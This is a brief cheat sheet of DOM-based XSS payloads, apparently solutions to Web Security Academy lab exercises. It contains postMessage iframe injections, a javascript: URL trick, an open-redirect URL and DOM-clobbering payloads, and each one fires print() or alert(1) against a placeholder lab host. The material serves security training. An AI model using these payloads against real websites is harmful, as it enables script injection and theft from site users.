# DOM-XSS

Payloads

1. <iframe src="url" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">

2. <iframe src="url" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

3.  <iframe src=url onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

4.  https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

5.  <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">

6. <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

7.  <form id=x tabindex=0 onfocus=print()><input id=attributes>      first in comments 
     <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
